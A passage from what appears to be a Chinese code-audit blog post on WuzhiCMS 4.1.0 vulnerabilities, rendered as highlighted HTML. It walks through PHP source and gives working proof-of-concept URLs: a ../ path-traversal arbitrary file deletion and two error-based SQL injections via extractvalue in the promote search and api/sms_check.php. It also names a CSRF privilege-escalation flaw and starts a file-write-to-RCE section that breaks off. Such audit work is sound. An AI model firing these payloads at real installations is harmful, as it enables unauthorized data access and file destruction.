+</span></span><span class="line"><span class="cl">			<span class="nx">MSG</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;delete success&#39;</span><span class="p">),</span> <span class="nx">HTTP_REFERER</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$url</span><span class="p">)</span> <span class="nx">MSG</span><span class="p">(</span><span class="s1">&#39;url del &#39;</span> <span class="o">.</span> <span class="nx">L</span><span class="p">(</span><span class="s1">&#39;operation_failure&#39;</span><span class="p">),</span> <span class="nx">HTTP_REFERER</span><span class="p">,</span> <span class="mi">3000</span><span class="p">);</span><span class="c1">//按url 删除，如果没有 URL，报错返回。
+</span></span></span><span class="line"><span class="cl">            <span class="nv">$path</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="nx">ATTACHMENT_URL</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span><span class="c1">//将 URL 中的 ATTACHMENT_URL 去掉，得到文件相对路径 path
+</span></span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$where</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;path&#39;</span> <span class="o">=&gt;</span> <span class="nv">$path</span><span class="p">);</span><span class="c1">//根据 path 查找数据库记录
+</span></span></span><span class="line"><span class="cl">                <span class="nv">$att_info</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">get_one</span><span class="p">(</span><span class="s1">&#39;attachment&#39;</span><span class="p">,</span> <span class="nv">$where</span><span class="p">,</span> <span class="s1">&#39;usertimes,id&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$att_info</span><span class="p">))</span> <span class="p">{</span><span class="c1">//如果没有记录，只删物理文件
+</span></span></span><span class="line"><span class="cl">                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">my_unlink</span><span class="p">(</span><span class="nx">ATTACHMENT_ROOT</span> <span class="o">.</span> <span class="nv">$path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">MSG</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;operation_success&#39;</span><span class="p">),</span> <span class="nx">HTTP_REFERER</span><span class="p">,</span> <span class="mi">3000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nv">$att_info</span><span class="p">[</span><span class="s1">&#39;usertimes&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="c1">//引用多次，只减引用次数
+</span></span></span><span class="line"><span class="cl">                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">update</span><span class="p">(</span><span class="s1">&#39;attachment&#39;</span><span class="p">,</span> <span class="s1">&#39;usertimes = usertimes-1&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;id&#39;</span> <span class="o">=&gt;</span> <span class="nv">$att_info</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">my_unlink</span><span class="p">(</span><span class="nx">ATTACHMENT_ROOT</span> <span class="o">.</span> <span class="nv">$path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">delete</span><span class="p">(</span><span class="s1">&#39;attachment&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;id&#39;</span> <span class="o">=&gt;</span> <span class="nv">$att_info</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">MSG</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;operation_success&#39;</span><span class="p">),</span> <span class="nx">HTTP_REFERER</span><span class="p">,</span> <span class="mi">3000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">MSG</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;operation_failure&#39;</span><span class="p">),</span> <span class="nx">HTTP_REFERER</span><span class="p">,</span> <span class="mi">3000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>跟进my_unlink</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">private</span> <span class="k">function</span> <span class="nf">my_unlink</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="nx">unlink</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span><span class="c1">//文件存在直接删除
+</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>index.php?m=attachment&amp;f=index&amp;v=del&amp;_su=wuzhicms&amp;url=../../1.txt</p>
+<p><img alt="20250717140708632" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080955817.png"></p>
+<h2 id="sql注入">SQL注入<a hidden class="anchor" aria-hidden="true" href="#sql注入">#</a></h2>
+<p>搜索select</p>
+<p>发现这里的很多参数都是原样拼接，可能存在风险</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//  coreframe/app/core/libs/class/mysqli.class.php
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">get_list</span><span class="p">(</span><span class="nv">$table</span><span class="p">,</span> <span class="nv">$where</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$field</span> <span class="o">=</span> <span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="nv">$limit</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$order</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$group</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$keyfield</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$where</span> <span class="o">=</span> <span class="nv">$where</span> <span class="o">?</span> <span class="s1">&#39; WHERE &#39;</span><span class="o">.</span><span class="nv">$where</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$field</span> <span class="o">=</span> <span class="nv">$field</span> <span class="o">==</span> <span class="s1">&#39;*&#39;</span> <span class="o">?</span> <span class="s1">&#39;*&#39;</span> <span class="o">:</span> <span class="nx">self</span><span class="o">::</span><span class="na">safe_filed</span><span class="p">(</span><span class="nv">$field</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$order</span> <span class="o">=</span> <span class="nv">$order</span> <span class="o">?</span> <span class="s1">&#39; ORDER BY &#39;</span><span class="o">.</span><span class="nv">$order</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$group</span> <span class="o">=</span> <span class="nv">$group</span> <span class="o">?</span> <span class="s1">&#39; GROUP BY &#39;</span><span class="o">.</span><span class="nv">$group</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$limit</span> <span class="o">=</span> <span class="nv">$limit</span> <span class="o">?</span> <span class="s1">&#39; LIMIT &#39;</span><span class="o">.</span><span class="nv">$limit</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;SELECT &#39;</span><span class="o">.</span><span class="nv">$field</span><span class="o">.</span><span class="s1">&#39; FROM `&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">tablepre</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;`&#39;</span><span class="o">.</span><span class="nv">$where</span><span class="o">.</span><span class="nv">$group</span><span class="o">.</span><span class="nv">$order</span><span class="o">.</span><span class="nv">$limit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$query</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">while</span><span class="p">(</span><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fetch_array</span><span class="p">(</span><span class="nv">$query</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nv">$keyfield</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$arr</span><span class="p">[</span><span class="nv">$data</span><span class="p">[</span><span class="nv">$keyfield</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$arr</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$arr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></div><p>跟进get_list函数，最后只找到这里有可控变量 $fieldtype、$keywords</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// coreframe/app/promote/admin/index.php
+</span></span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">search</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$siteid</span> <span class="o">=</span> <span class="nx">get_cookie</span><span class="p">(</span><span class="s1">&#39;siteid&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$page</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$page</span> <span class="o">=</span> <span class="nx">max</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$fieldtype</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;fieldtype&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$keywords</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;keywords&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$fieldtype</span><span class="o">==</span><span class="s1">&#39;place&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$where</span> <span class="o">=</span> <span class="s2">&#34;`siteid`=&#39;</span><span class="si">$siteid</span><span class="s2">&#39; AND `name` LIKE &#39;%</span><span class="si">$keywords</span><span class="s2">%&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">get_list</span><span class="p">(</span><span class="s1">&#39;promote_place&#39;</span><span class="p">,</span> <span class="nv">$where</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span><span class="nv">$page</span><span class="p">,</span><span class="s1">&#39;pid ASC&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$pages</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">pages</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$total</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">number</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">include</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="p">(</span><span class="s1">&#39;listingplace&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$where</span> <span class="o">=</span> <span class="s2">&#34;`siteid`=&#39;</span><span class="si">$siteid</span><span class="s2">&#39; AND `</span><span class="si">$fieldtype</span><span class="s2">` LIKE &#39;%</span><span class="si">$keywords</span><span class="s2">%&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">get_list</span><span class="p">(</span><span class="s1">&#39;promote&#39;</span><span class="p">,</span><span class="nv">$where</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span><span class="nv">$page</span><span class="p">,</span><span class="s1">&#39;id DESC&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$pages</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">pages</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$total</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">number</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">include</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="p">(</span><span class="s1">&#39;listing&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>$fieldtype、$keywords俩个参数拼接到$where中，</p>
+<p>构造poc:</p>
+<p><code>index.php?m=promote&amp;f=index&amp;_su=wuzhicms&amp;v=search&amp;fieldtype=place&amp;keywords=1%27%20or%20extractvalue(1,concat(0x7e,user()))%20--+</code></p>
+<p><img alt="20250717143106637" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080955190.png"></p>
+<h1 id="记一些知识点函数">记一些知识点、函数<a hidden class="anchor" aria-hidden="true" href="#记一些知识点函数">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$GLOBALS = array();//清除所有的全局变量
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">microtime函数返回当前 Unix 时间戳的微秒数。
+</span></span></code></pre></div><p>magic_quotes_runtime 的作用</p>
+<p><a href="http://blog.csdn.net/tom_green/article/details/7039002">http://blog.csdn.net/tom_green/article/details/7039002</a></p>
+<p>magic_quotes_gpc函数详解</p>
+<p><a href="https://www.cnblogs.com/timelesszhuang/p/3726736.html">https://www.cnblogs.com/timelesszhuang/p/3726736.html</a></p>
+<h1 id="漏洞补充">漏洞补充：<a hidden class="anchor" aria-hidden="true" href="#漏洞补充">#</a></h1>
+<h2 id="csrf漏洞">CSRF漏洞<a hidden class="anchor" aria-hidden="true" href="#csrf漏洞">#</a></h2>
+<p>五指CMS 4.1.0版本存在一个CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可将普通用户提成为管理员权限。</p>
+<h2 id="前台sql注入">前台SQL注入<a hidden class="anchor" aria-hidden="true" href="#前台sql注入">#</a></h2>
+<p>多个变量未使用引号包裹的SQL语句,只要是调用<code>get_one</code>这个函数的地方都存在SQL注入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">get_one</span><span class="p">(</span><span class="nv">$table</span><span class="p">,</span> <span class="nv">$where</span><span class="p">,</span> <span class="nv">$field</span> <span class="o">=</span> <span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="nv">$limit</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$order</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$group</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$condition</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$where</span> <span class="o">=</span> <span class="nv">$where</span> <span class="o">?</span> <span class="s1">&#39; WHERE &#39;</span><span class="o">.</span><span class="nv">$where</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$condition</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$field</span> <span class="o">=</span> <span class="nv">$field</span> <span class="o">==</span> <span class="s1">&#39;*&#39;</span> <span class="o">?</span> <span class="s1">&#39;*&#39;</span> <span class="o">:</span> <span class="nx">self</span><span class="o">::</span><span class="na">safe_filed</span><span class="p">(</span><span class="nv">$field</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$field</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">escape_string</span><span class="p">(</span><span class="nv">$field</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$order</span> <span class="o">=</span> <span class="nv">$order</span> <span class="o">?</span> <span class="s1">&#39; ORDER BY &#39;</span><span class="o">.</span><span class="nv">$order</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$group</span> <span class="o">=</span> <span class="nv">$group</span> <span class="o">?</span> <span class="s1">&#39; GROUP BY &#39;</span><span class="o">.</span><span class="nv">$group</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$limit</span> <span class="o">=</span> <span class="nv">$limit</span> <span class="o">?</span> <span class="s1">&#39; LIMIT &#39;</span><span class="o">.</span><span class="nv">$limit</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;SELECT &#39;</span><span class="o">.</span><span class="nv">$field</span><span class="o">.</span><span class="s1">&#39; FROM `&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">tablepre</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;`&#39;</span><span class="o">.</span><span class="nv">$where</span><span class="o">.</span><span class="nv">$group</span><span class="o">.</span><span class="nv">$order</span><span class="o">.</span><span class="nv">$limit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$query</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fetch_array</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></div><p>api/sms_check.php,找到可控变量</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;WWW_ROOT&#39;</span><span class="p">,</span><span class="nx">substr</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;../configs/web_config.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="nx">COREFRAME_ROOT</span><span class="o">.</span><span class="s1">&#39;core.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;param&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">(</span><span class="s1">&#39;{&#34;info&#34;:&#34;验证失败&#34;,&#34;status&#34;:&#34;n&#34;}&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;param&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">(</span><span class="s1">&#39;{&#34;info&#34;:&#34;验证失败&#34;,&#34;status&#34;:&#34;n&#34;}&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$code</span> <span class="o">=</span> <span class="nx">strip_tags</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;param&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$posttime</span> <span class="o">=</span> <span class="nx">SYS_TIME</span><span class="o">-</span><span class="mi">300</span><span class="p">;</span><span class="c1">//5分钟内有效
+</span></span></span><span class="line"><span class="cl"><span class="nv">$db</span> <span class="o">=</span> <span class="nx">load_class</span><span class="p">(</span><span class="s1">&#39;db&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$r</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">get_one</span><span class="p">(</span><span class="s1">&#39;sms_checkcode&#39;</span><span class="p">,</span><span class="s2">&#34;`code`=&#39;</span><span class="si">$code</span><span class="s2">&#39; AND `posttime`&gt;</span><span class="si">$posttime</span><span class="s2">&#34;</span><span class="p">,</span><span class="s1">&#39;*&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;id DESC&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">(</span><span class="s1">&#39;{&#34;info&#34;:&#34;验证通过&#34;,&#34;status&#34;:&#34;y&#34;}&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">exit</span><span class="p">(</span><span class="s1">&#39;{&#34;info&#34;:&#34;验证失败&#34;,&#34;status&#34;:&#34;n&#34;}&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>api/sms_check.php?param=1%27%20or%20extractvalue(1,concat(0x7e,(select%20user())))%20&ndash;+</p>
+<p><img alt="20250717144135245" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080956325.png"></p>
+<h2 id="任意文件写入导致rce">任意文件写入导致RCE<a hidden class="anchor" aria-hidden="true" href="#任意文件写入导致rce">#</a></h2>
+<p>搜索<code>file_put_contents()</code> 函数,找到一处写入内容可控的地方。file_put_contents() 函数把一个字符串写入文件中。</p>
+<p>coreframe/app/core/libs/function/common.func.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">set_cache</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;_cache_&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">static</span> <span class="nv">$_dirs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nv">$dir</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/([a-z0-9_]+)/i&#39;</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">))</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$cache_path</span> <span class="o">=</span> <span class="nx">CACHE_ROOT</span> <span class="o">.</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_dirs</span><span class="p">[</span><span class="nv">$filename</span> <span class="o">.</span> <span class="nv">$dir</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$cache_path</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">mkdir</span><span class="p">(</span><span class="nv">$cache_path</span><span class="p">,</span> <span class="mo">0777</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$_dirs</span><span class="p">[</span><span class="nv">$filename</span> <span class="o">.</span> <span class="nv">$dir</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$cache_path</span> <span class="o">.</span> <span class="nv">$filename</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nx">CACHE_EXT</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
